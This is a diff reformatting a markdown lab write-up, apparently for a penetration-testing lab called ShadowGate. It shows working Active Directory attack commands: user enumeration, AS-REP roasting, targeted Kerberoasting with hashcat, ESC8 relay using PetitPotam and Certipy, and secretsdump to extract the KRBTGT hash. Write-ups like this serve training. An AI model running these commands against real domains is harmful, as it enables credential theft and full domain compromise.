@@ -1,8 +1,10 @@
 # ShadowGate
 
-![image.png](ShadowGate/image.png)
+## ShadowGate
 
-## Objective
+![image.png](<../.gitbook/assets/image (12).png>)
+
+### Objective
 
 ShadowGate recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.
 
@@ -12,11 +14,11 @@ The assessment will evaluate whether a motivated attacker with standard network 
 
 The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.
 
-## Initial Access
+### Initial Access
 
 The client has provided you with VPN access to their internal network, but no credentials.
 
-### Open Ports
+#### Open Ports
 
 ```bash
 53/tcp    open  domain        Simple DNS Plus
@@ -36,9 +38,9 @@ The client has provided you with VPN access to their internal network, but no cr
 9389/tcp  open  mc-nmf        .NET Message Framing
 ```
 
-## Recon & Enumeration
+### Recon & Enumeration
 
-### Rustscan `rustscan -a 10.1.107.189 -- -A`
+#### Rustscan `rustscan -a 10.1.107.189 -- -A`
 
 ```bash
 PORT      STATE SERVICE       REASON          VERSION
@@ -148,31 +150,30 @@ _ssl-date: TLS randomness does not represent time
 
 ```
 
-- The scan provided us with the information that the client has provided
-- As a rule, we test all the ports that are provided to us
-- Important information to note:
-    
+* The scan provided us with the information that the client has provided
+* As a rule, we test all the ports that are provided to us
+*   Important information to note:
+
     ```bash
     DC01.shadow.gate
     shadow.gate
     ```
-    
-- `shadow-DC01-CA/domainComponent=shadow`We might want to test for ADCS
+* `shadow-DC01-CA/domainComponent=shadow`We might want to test for ADCS
 
-# **DNS Zone Transfer - port 53**
+## **DNS Zone Transfer - port 53**
 
 ```bash
 dig axfr shadow.gate @10.1.107.189
 ```
 
-![image.png](ShadowGate/image%201.png)
+![image.png](<../.gitbook/assets/image 1 (11).png>)
 
-- not able to get anything interesting
+* not able to get anything interesting
 
-## Username Enumeration
+### Username Enumeration
 
-- Below are the commands that i test `from my notes` to enumerate usernames if we are provided with any
-- Also supplement that with https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg and https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
+* Below are the commands that i test `from my notes` to enumerate usernames if we are provided with any
+* Also supplement that with https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg and https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
 
 ```bash
 nxc smb shadow.gate -u '' -p '' --rid-brute | grep 'SidTypeUser' > names.txt
@@ -187,194 +188,193 @@ rpcclient -U '%' 10.1.107.189 -c "enumdomusers"
 rpcclient -U '%'10.1.107.189 -c "querydispinfo"
 ```
 
-![[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)](ShadowGate/image%202.png)
+![https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](<../.gitbook/assets/image 2 (11).png>)
 
-[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
+[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 
-![image.png](ShadowGate/image%203.png)
+![image.png](<../.gitbook/assets/image 3 (11).png>)
 
-![image.png](ShadowGate/image%204.png)
+![image.png](<../.gitbook/assets/image 4 (11).png>)
 
-- We have obtained users
-- As a best practice, we can test if the usernames are valid as well
-    
+* We have obtained users
+*   As a best practice, we can test if the usernames are valid as well
+
     ```bash
     kerbrute userenum --dc 10.1.107.189 --domain shadow.gate users.txt
     ```
-    
-    ![image.png](ShadowGate/image%205.png)
-    
-    - Okay now we now have valid usernames and no password what can we do??
-    - Lets Reference https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg for way forwards
-    
-    ![image.png](ShadowGate/image%206.png)
-    
+
+    ![image.png](<../.gitbook/assets/image 5 (11).png>)
+
+    * Okay now we now have valid usernames and no password what can we do??
+    * Lets Reference https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg for way forwards
+
+    ![image.png](<../.gitbook/assets/image 6 (11).png>)
+
     https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory
-    
-    ![image.png](ShadowGate/image%207.png)
-    
-    ![image.png](ShadowGate/image%208.png)
-    
-    - We successfully obtained an asrep hash for user `jtrueblood` and cracked it
-    - Confirming if the creds work
-        
+
+    ![image.png](<../.gitbook/assets/image 7 (11).png>)
+
+    ![image.png](<../.gitbook/assets/image 8 (11).png>)
+
+    * We successfully obtained an asrep hash for user `jtrueblood` and cracked it
+    *   Confirming if the creds work
+
         ```bash
         nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' --shares
         ```
-        
-        ![image.png](ShadowGate/image%209.png)
-        
-        - Seeing `CertEnroll` with **READ** access on a Domain Controller is a significant find. It strongly suggests that **Active Directory Certificate Services (AD CS)** is running in this environment.
-        - Before we dive straight into ADCS , its always a good practise to obtained bloodhound data
 
-### Bloodhound
+        ![image.png](<../.gitbook/assets/image 9 (10).png>)
+
+        * Seeing `CertEnroll` with **READ** access on a Domain Controller is a significant find. It strongly suggests that **Active Directory Certificate Services (AD CS)** is running in this environment.
+        * Before we dive straight into ADCS , its always a good practise to obtained bloodhound data
+
+#### Bloodhound
 
 ```bash
 nxc ldap DC01.shadow.gate  -u jtrueblood -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.107.189
 ```
 
-![image.png](ShadowGate/image%2010.png)
+![image.png](<../.gitbook/assets/image 10 (10).png>)
 
-#### Bloodhound Enumeration
+**Bloodhound Enumeration**
 
-![image.png](ShadowGate/image%2011.png)
+![image.png](<../.gitbook/assets/image 11 (10).png>)
 
-![image.png](ShadowGate/image%2012.png)
+![image.png](<../.gitbook/assets/image 12 (10).png>)
 
-- The user `JTRUEBLOOD@SHADOW.GATE` has generic write access to the user `BBROWN@SHADOW.GATE`.
-- Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
+* The user `JTRUEBLOOD@SHADOW.GATE` has generic write access to the user `BBROWN@SHADOW.GATE`.
+* Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
 
-![image.png](ShadowGate/image%2013.png)
+![image.png](<../.gitbook/assets/image 13 (10).png>)
 
-- **`BBROWN`** is a member of **`ADCS-READER`**
-- **`AUTHENTICATED USERS`** (which includes , `JTRUEBLOOD`) is a member of **`CERTIFICATE SERVICE DCOM ACCESS`**.
-- Now we can move on to test ADCS
+* **`BBROWN`** is a member of **`ADCS-READER`**
+* **`AUTHENTICATED USERS`** (which includes , `JTRUEBLOOD`) is a member of **`CERTIFICATE SERVICE DCOM ACCESS`**.
+* Now we can move on to test ADCS
 
 ```bash
 certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
 ```
 
-![image.png](ShadowGate/image%2014.png)
+![image.png](<../.gitbook/assets/image 14 (10).png>)
 
-- The Certipy output confirms that **Web Enrollment is enabled over HTTP** and **Authenticated Users** have **Enroll** permissions.
-- ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint
-- We can use https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation for our privesc
+* The Certipy output confirms that **Web Enrollment is enabled over HTTP** and **Authenticated Users** have **Enroll** permissions.
+* ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint
+* We can use https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation for our privesc
 
-![image.png](ShadowGate/image%2015.png)
+![image.png](<../.gitbook/assets/image 15 (9).png>)
 
-#### Exploiting ESC8 requires two main components:
+**Exploiting ESC8 requires two main components:**
 
 1. Coercing a privileged authentication to the attacker's machine.
-2. Relaying this authentication using Certipy to the vulnerable AD CS web enrollment service.
-    
+2.  Relaying this authentication using Certipy to the vulnerable AD CS web enrollment service.
+
     **Step 1: Start the Certipy NTLM relay**
-    
+
     ```bash
     certipy relay \
         -target 'https://10.1.107.189' -template 'DC01.shadow.gate'
     ```
-    
+
     **Step 2: Coerce authentication from a privileged account to the Certipy relay**
-    
-    - The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force the target (e.g., a Domain Controller `DC.CORP.LOCAL` or a privileged user `Administrator`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.
-    - https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
-    
-    ![image.png](ShadowGate/image%2016.png)
-    
+
+    * The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force the target (e.g., a Domain Controller `DC.CORP.LOCAL` or a privileged user `Administrator`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.
+    * https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
+
+    ![image.png](<../.gitbook/assets/image 16 (9).png>)
+
     ```bash
     nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus
     ```
-    
-    ![image.png](ShadowGate/image%2017.png)
-    
-    - It’s vulnerable to almost every major coercion method in the book: **DFSCoerce, PetitPotam, PrinterBug,** and **MSEven**.
-    - now we need to trigger the coercion using `PetitPotam`
-        
+
+    ![image.png](<../.gitbook/assets/image 17 (9).png>)
+
+    * It’s vulnerable to almost every major coercion method in the book: **DFSCoerce, PetitPotam, PrinterBug,** and **MSEven**.
+    *   now we need to trigger the coercion using `PetitPotam`
+
         ```bash
         nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus -o LISTENER=10.200.56.20 ALWAYS=true
         ```
-        
-        ![image.png](ShadowGate/image%2018.png)
-        
-        ![image.png](ShadowGate/image%2019.png)
-        
+
+        ![image.png](<../.gitbook/assets/image 18 (9).png>)
+
+        ![image.png](<../.gitbook/assets/image 19 (9).png>)
+
         Received connection without a Saved certificate
-        
+
         ```bash
         certipy relay -target 'http://10.1.107.189/certsrv/certfnsh.asp' -template 'Machine'
         ```
-        
-        ![image.png](ShadowGate/image%2020.png)
-        
-        - target template and identity that is being relayed DO NOT have permission to enroll.
-        - **`BBROWN`** is a member of **`ADCS-READER`**
-        - We need to use bbrown instead since they have `ADCS-READER`
 
-## Compromising BBROWN
+        ![image.png](<../.gitbook/assets/image 20 (9).png>)
 
-![image.png](ShadowGate/image%2021.png)
+        * target template and identity that is being relayed DO NOT have permission to enroll.
+        * **`BBROWN`** is a member of **`ADCS-READER`**
+        * We need to use bbrown instead since they have `ADCS-READER`
 
-![image.png](ShadowGate/image%2022.png)
+### Compromising BBROWN
 
-- Need to perform a targeted kerberoast https://github.com/ShutdownRepo/targetedKerberoast
-    
+![image.png](<../.gitbook/assets/image 21 (9).png>)
+
+![image.png](<../.gitbook/assets/image 22 (9).png>)
+
+*   Need to perform a targeted kerberoast https://github.com/ShutdownRepo/targetedKerberoast
+
     ```bash
     targetedKerberoast.py -v -d 'shadow.gate' -u jtrueblood -p 'REDACTED'
     ```
-    
-    ![image.png](ShadowGate/image%2023.png)
-    
-    - The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
-    
+
+    ![image.png](<../.gitbook/assets/image 23 (9).png>)
+
+    * The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
+
     ```bash
     hashcat -m 13100 -a0 TK.txt /usr/share/wordlists/rockyou.txt
     ```
-    
-    ![image.png](ShadowGate/image%2024.png)
-    
-    - Successfully obtained `bbrown` password
 
-### Testing `bbrown` Creds
+    ![image.png](<../.gitbook/assets/image 24 (9).png>)
+
+    * Successfully obtained `bbrown` password
+
+#### Testing `bbrown` Creds
 
 ```bash
 nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
 ```
 
-![image.png](ShadowGate/image%2025.png)
+![image.png](<../.gitbook/assets/image 25 (9).png>)
 
-- Successfully obtained valid creds
-- Now we can pivot to using `bbrown` to Exploiting ESC8
-    
+* Successfully obtained valid creds
+*   Now we can pivot to using `bbrown` to Exploiting ESC8
+
     ```bash
     nxc smb 10.1.107.189 -u 'bbrown' -p 'REDACTED' -d shadow.gate -M coerce_plus -o LISTENER=10.200.56.20 
      
     certipy relay -target 'http://10.1.107.189/certsrv/certfnsh.asp' -template 'DomainController'
      
-    
+
     ```
-    
-    ![image.png](ShadowGate/image%2026.png)
-    
+
+    ![image.png](<../.gitbook/assets/image 26 (9).png>)
+
     OR USE THE BELOW
-    
-    - Looking at https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg we can use the [petitpotam.py](http://petitpotam.py)  https://github.com/topotam/PetitPotam
-    
-    ![image.png](ShadowGate/image%2027.png)
-    
+
+    * Looking at https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg we can use the [petitpotam.py](http://petitpotam.py) https://github.com/topotam/PetitPotam
+
+    ![image.png](<../.gitbook/assets/image 27 (9).png>)
+
     ```bash
     python3 PetitPotam.py -u 'bbrown' -p 'REDACTED' -d shadow.gate 10.200.56.20 10.1.107.189
     ```
-    
+
     **Step 4: Authenticate using the obtained certificate.**
-    
+
     ```bash
     certipy auth -pfx 'dc01.pfx' -dc-ip '10.1.107.189'
     ```
-    
-    ![image.png](ShadowGate/image%2028.png)
-    
 
-### What is the KRBTGT NT Hash?
+    ![image.png](<../.gitbook/assets/image 28 (8).png>)
+
+#### What is the KRBTGT NT Hash?
 
 ```bash
 ~/impacket-venv/bin/secretsdump.py \
@@ -383,4 +383,4 @@ nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
   -just-dc
 ```
 
-![image.png](ShadowGate/image%2029.png)
+![image.png](<../.gitbook/assets/image 29 (8).png>)
